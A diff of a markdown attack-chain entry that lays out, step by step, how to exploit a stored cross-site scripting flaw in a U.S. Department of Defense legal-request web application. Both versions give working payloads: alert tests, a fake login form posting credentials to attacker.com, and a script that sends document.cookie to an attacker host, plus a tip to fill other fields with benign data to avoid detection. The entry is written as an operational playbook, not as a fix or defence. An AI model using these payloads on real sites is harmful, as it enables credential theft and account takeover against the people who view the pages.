@@ -1,13 +1,12 @@
 ---
-id: ac-uuid-001
+id: ac-stored-xss-dod-worksheet-credential-theft
 tags:
   - xss
   - stored-xss
   - credential-theft
   - account-takeover
-  - phishing
+  - web
   - dod
-  - web-vulnerability
 type: attack_chain
 tools: []
 tactics:
@@ -17,23 +16,28 @@ verified: false
 platforms:
   - Web
 submitted: true
+complexity: medium
 created_at: '2023-10-01T00:00:00Z'
 procedures:
-  - '[[procedures/Access-and-Navigate-to-Worksheet-Form]]'
-  - '[[procedures/Test-Form-Fields-for-XSS]]'
+  - '[[procedures/Access-DoD-Application-Main-Page]]'
+  - '[[procedures/Navigate-to-Worksheet-Creation]]'
+  - '[[procedures/Proceed-to-Worksheet-Form]]'
+  - '[[procedures/Submit-Initial-Name-Field]]'
   - '[[procedures/Inject-XSS-Payloads-into-Vulnerable-Fields]]'
-  - '[[procedures/Submit-Worksheet-and-Trigger-Stored-XSS]]'
-  - '[[procedures/Demonstrate-XSS-Impact-with-Payloads]]'
+  - '[[procedures/Submit-Malicious-Worksheet]]'
+  - '[[procedures/Trigger-XSS-by-Viewing-Worksheet]]'
+  - '[[procedures/Demonstrate-Credential-Theft-Impact]]'
 step_count: 8
 techniques:
   - '[[JavaScript]]'
-updated_at: '2025-12-14T03:16:36.866Z'
+updated_at: '2025-12-14T17:33:06.217Z'
 description: >-
-  Exploits a stored XSS vulnerability in approximately 64 text fields of a U.S.
-  Department of Defense web application's worksheet form, allowing injection of
-  malicious JavaScript that executes when legal personnel view the worksheets,
-  enabling credential theft via phishing, account takeover, keystroke logging,
-  or drive-by downloads.
+  Multi-stage exploitation of a stored XSS vulnerability in a U.S. Department of
+  Defense web application used for legal requests, allowing injection of
+  malicious JavaScript into worksheet fields to steal credentials when viewed by
+  authorized personnel.
+skill_level: intermediate
+impact_level: high
 validated: true
 mitre_tactics:
   - '[[Execution]]'
@@ -43,7 +47,7 @@ mitre_techniques:
 ---
 # Stored XSS in DoD Worksheet Form Leading to Credential Theft and Account Takeover
 
-Multi-stage attack chain demonstrating exploitation of a stored cross-site scripting (XSS) vulnerability in a U.S. Department of Defense web application. The attack targets worksheet forms used by legal personnel, injecting malicious JavaScript into approximately 64 text fields. When authenticated users view the submitted worksheets, the payloads execute in their browser context, potentially stealing credentials, logging keystrokes, or facilitating account takeovers.
+Multi-stage attack chain demonstrating the exploitation of a stored XSS vulnerability in approximately 64 text fields of a U.S. Department of Defense web application for legal requests. The attack involves injecting malicious JavaScript payloads into worksheet forms, which execute when authorized legal personnel view or modify the stored data, enabling credential theft, account takeover, keystroke logging, and drive-by downloads.
 
 ## Chain Metrics Dashboard
 
@@ -60,22 +64,18 @@ Multi-stage attack chain demonstrating exploitation of a stored cross-site scrip
 
 ```mermaid
 graph LR
-    A[Access Application] --> B[Navigate to Form]
-    B --> C[Test Sanitization]
-    C --> D[Inject Payloads]
-    D --> E[Submit Worksheet]
-    E --> F[Trigger XSS]
-    F --> G[Execute Malicious JS]
-    G --> H[Steal Credentials]
+    A[Initial Access: Navigate to Application] --> B[Discovery: Identify Vulnerable Form]
+    B --> C[Execution: Inject XSS Payloads]
+    C --> D[Persistence: Submit Stored Data]
+    D --> E[Impact: Trigger Payload on View/Modify]
+    E --> F[Exfiltration: Steal Credentials]
 
     style A fill:#e74c3c
-    style B fill:#e74c3c
-    style C fill:#f39c12
-    style D fill:#f39c12
-    style E fill:#3498db
-    style F fill:#3498db
-    style G fill:#27ae60
-    style H fill:#27ae60
+    style B fill:#f39c12
+    style C fill:#3498db
+    style D fill:#9b59b6
+    style E fill:#f39c12
+    style F fill:#27ae60
 ```
 
 ## Prerequisites & Requirements
@@ -86,130 +86,129 @@ graph LR
 
 ### Target Environment
 
-- Web application: U.S. DoD internal portal (https://█████)
+- Web application at https://█████ ██████ (DoD legal request portal)
 - Required services/ports: HTTPS (443)
-- Network access requirements: Authenticated access to the DoD application (user account with worksheet submission privileges)
+- Network access requirements: Internet access to the public-facing DoD site
 
 ### Initial Access Requirements
 
-- Credential requirements: Valid DoD user credentials
-- Network position: Internal network or VPN access to the application
-- Prior access needed: None beyond authentication
+- No credentials required for initial submission (tested as unauthenticated user)
+- Authorized personnel viewing the worksheet (for payload execution)
+- Network position: External attacker with access to the web app
 
 ## Detailed Attack Procedures
 
 ### Step 1: Access the Main Page
-procedure: [[procedures/Access-and-Navigate-to-Worksheet-Form]]
+procedure: [[procedures/Access-DoD-Application-Main-Page]]
 
-**Objective**: Gain entry to the DoD web application to begin the worksheet creation process.
+**Objective**: Gain initial access to the DoD web application entry point.
 
-**Instructions**: Open a web browser and navigate to the application's main page by browsing to https://█████. Ensure you are authenticated with valid credentials if required.
+**Instructions**: Open a web browser and navigate directly to the main application URL. No authentication is required at this stage for basic access.
 
-**Expected Output**: Successful login and display of the main dashboard or portal page.
+**Expected Output**: The main login or landing page of the DoD legal request application loads successfully.
 
 **Success Indicators**:
-- Application homepage loads without errors
-- User session is active
+- Page title or content indicates the DoD application is accessible
+- No immediate errors or blocks (e.g., no CAPTCHA or rate limiting)
 
 ### Step 2: Navigate to the Worksheet Creation Page
-procedure: [[procedures/Access-and-Navigate-to-Worksheet-Form]]
+procedure: [[procedures/Navigate-to-Worksheet-Creation]]
 
-**Objective**: Locate and enter the worksheet creation workflow.
+**Objective**: Locate and enter the section for creating legal request worksheets.
 
-**Instructions**: From the main page, click on █████████. Once on the ██████ page, click ███ and then ████████ to proceed to the form entry section. This positions you in the multi-step form process for creating a new worksheet.
+**Instructions**: From the main page, click on the appropriate link or button labeled `█████████`. Once on the subsequent page, select `███ and ████████` from the available options to proceed to worksheet creation.
 
-**Expected Output**: Worksheet creation interface appears, prompting for initial inputs.
-
-**Success Indicators**:
-- Navigation completes without redirects or errors
-- Form fields for worksheet data are visible
-
-### Step 3: Proceed to the Form and Enter Basic Information
-procedure: [[procedures/Access-and-Navigate-to-Worksheet-Form]]
-
-**Objective**: Advance through the initial form steps and test basic input sanitization.
-
-**Instructions**: Click "Continue" to move to the detailed form. Fill in basic fields such as your name with a simple XSS test payload like `<script>alert(1)</script>`, then click Submit. Observe if the payload is sanitized (it should be in the name field based on initial tests).
-
-**Expected Output**: Form submission confirmation, with no alert triggered in the name field.
+**Expected Output**: Redirected to the worksheet creation interface with options to start a new request form.
 
 **Success Indicators**:
-- Basic fields submit successfully
-- No JavaScript execution in sanitized fields
+- Worksheet creation menu or page is visible
+- Navigation completes without errors
 
-### Step 4: Test Initial Sanitization in Form Fields
-procedure: [[procedures/Test-Form-Fields-for-XSS]]
+### Step 3: Proceed to the Form
+procedure: [[procedures/Proceed-to-Worksheet-Form]]
 
-**Objective**: Identify which form fields properly sanitize input versus those vulnerable to XSS.
+**Objective**: Advance to the detailed input form for the worksheet.
 
-**Instructions**: After basic submission, return to the form and systematically test additional text fields with XSS payloads like `<script>alert('XSS')</script>`. Note that while the name field sanitizes, subsequent text inputs in the worksheet do not filter HTML or script tags effectively.
+**Instructions**: Click the `Continue` button to load the full form. Fill in any preliminary fields as prompted to reach the text input sections.
 
-**Expected Output**: Payloads execute or persist unsanitized in non-name fields, confirming vulnerability.
+**Expected Output**: The multi-field worksheet form loads, including text areas for legal request details.
 
 **Success Indicators**:
-- Alerts or malformed rendering in tested fields
-- Approximately 64 fields identified as vulnerable through enumeration
+- Form fields (including text areas) are editable
+- No sanitization warnings during initial input
+
+### Step 4: Submit Initial Name Field
+procedure: [[procedures/Submit-Initial-Name-Field]]
+
+**Objective**: Test and submit the initial sanitized field to progress to vulnerable areas.
+
+**Instructions**: Enter a valid name in the initial name field and click `Submit`. Basic XSS payloads (e.g., `<script>alert(1)</script>`) are sanitized here, confirming initial protections but allowing progression.
+
+**Expected Output**: Form advances to subsequent sections with text fields; no alert or execution from initial payload.
+
+**Success Indicators**:
+- Form submission succeeds
+- Access granted to additional text fields
 
 ### Step 5: Inject XSS Payloads into Vulnerable Fields
 procedure: [[procedures/Inject-XSS-Payloads-into-Vulnerable-Fields]]
 
-**Objective**: Populate the form with malicious JavaScript in all exploitable text areas to store the payload server-side.
+**Objective**: Identify and populate the 64 vulnerable text fields with malicious JavaScript.
 
-**Instructions**: Complete the worksheet form by entering targeted XSS payloads in every text-accepting field (totaling around 64). Use payloads designed for credential theft, such as fake login forms or cookie exfiltration scripts. For example, insert `<h3>Please login to proceed</h3><form action="http://attacker.com/steal">Username:<br><input type="text" name="username"><br>Password:<br><input type="password" name="password"><br><input type="submit" value="Logon"></form>` in multiple fields.
+**Instructions**: In all subsequent text-accepting fields (approximately 64 total), inject XSS payloads such as `<script>alert('XSS')</script>` or more advanced ones for testing. Complete other required fields with benign data to avoid detection.
 
-**Expected Output**: Form filled with payloads; no immediate execution as it's stored.
+**Expected Output**: Form accepts payloads without sanitization errors; fields store the injected HTML/JS.
 
 **Success Indicators**:
-- All 64 fields populated without form rejection
-- Payloads visible in form preview if available
+- Payloads are entered without rejection
+- Form remains submittable
 
 ### Step 6: Submit the Form
-procedure: [[procedures/Submit-Worksheet-and-Trigger-Stored-XSS]]
+procedure: [[procedures/Submit-Malicious-Worksheet]]
 
-**Objective**: Store the malicious payloads on the server by finalizing the worksheet submission.
+**Objective**: Persist the injected payloads by submitting the worksheet.
 
-**Instructions**: Review the form and click "Finish" to submit. The application will process the input and store the worksheet, returning a confirmation message with a ticket number.
+**Instructions**: Review the form and click `Finish` to submit. The system confirms submission and provides a ticket number for the request.
 
-**Expected Output**: Confirmation page with ticket number, indicating successful storage.
-
-**Success Indicators**:
-- Submission succeeds
-- Ticket number generated for tracking the worksheet
-
-### Step 7: Trigger the Stored XSS
-procedure: [[procedures/Submit-Worksheet-and-Trigger-Stored-XSS]]
-
-**Objective**: Cause the stored payloads to execute by having an authenticated user view the worksheet.
-
-**Instructions**: As the attacker (or simulating a victim), click ███████ or return to the ████████ page, enter your ticket info in the █████ area to view or modify the worksheet. The injected JavaScript will execute automatically upon rendering the text fields.
-
-**Expected Output**: Malicious JavaScript runs in the viewer's browser context, e.g., displaying a fake login form or redirecting with cookies.
+**Expected Output**: Confirmation message with ticket number; worksheet stored in the backend.
 
 **Success Indicators**:
-- Payload execution confirmed (alert, form display, or network request to attacker server)
-- No server-side errors during view
+- Submission confirmation displayed
+- Ticket number generated for tracking
 
-### Step 8: Demonstrate Impact with Specific Payloads
-procedure: [[procedures/Demonstrate-XSS-Impact-with-Payloads]]
+### Step 7: View or Modify the Worksheet to Trigger XSS
+procedure: [[procedures/Trigger-XSS-by-Viewing-Worksheet]]
 
-**Objective**: Validate the attack's potential for real harm, such as credential theft or account takeover.
+**Objective**: Execute the stored payload by accessing the worksheet as an authorized user.
 
-**Instructions**: Use advanced payloads like `<script>window.location="http://attacker.com/?cookie=" + document.cookie</script>` for cookie theft (testable if authenticated) or the phishing form payload mentioned earlier. Monitor attacker server for incoming data when a victim views the worksheet.
+**Instructions**: Use the ticket number to return to the `███████` page, enter details in the `█████` area, or click `██████` to view/modify. The payload executes upon rendering the fields.
 
-**Expected Output**: Stolen data (usernames, passwords, cookies) sent to attacker-controlled endpoint.
+**Expected Output**: Malicious JavaScript runs in the browser context, e.g., alert popup or form hijacking.
 
 **Success Indicators**:
-- Fake login form captures and submits credentials
-- Redirect occurs with appended cookies
-- Potential for keystroke logging or drive-by downloads if extended
+- JavaScript execution confirmed (e.g., alert fires)
+- No CSP or other blocks prevent execution
+
+### Step 8: Demonstrate Impact with Credential Theft Payload
+procedure: [[procedures/Demonstrate-Credential-Theft-Impact]]
+
+**Objective**: Show real-world impact like phishing for credentials or cookie exfiltration.
+
+**Instructions**: Use payloads such as: `<h3>Please login to proceed</h3><form action="http://██████"><input type="text" name="username"><input type="password" name="password"><input type="submit" value="Logon"></form>` for phishing, or `<script>window.location="http://███/?cookie=" + document.cookie</script>` for redirection and cookie theft. Test in a controlled environment.
+
+**Expected Output**: Fake login form appears or user redirected with cookies appended to URL.
+
+**Success Indicators**:
+- Credentials captured on attacker's server
+- Account takeover potential demonstrated
 
 ## Attack Chain Summary
 
 ### Key Achievements
 
-1. Identified and exploited stored XSS in 64 form fields due to inadequate sanitization.
-2. Demonstrated execution in the context of high-privilege legal personnel.
-3. Enabled severe impacts including credential theft and account takeover via phishing and data exfiltration.
+1. Successful injection and storage of XSS payloads in 64 fields without detection.
+2. Execution of arbitrary JavaScript in the context of high-privilege DoD personnel.
+3. Demonstration of credential theft and account takeover capabilities.
 
 ## Technique & Tactic Coverage
 
@@ -223,5 +222,4 @@ procedure: [[procedures/Demonstrate-XSS-Impact-with-Payloads]]
 - [[Collection]]
 
 ---
-
 *Last updated: 2023-10-01T00:00:00Z*
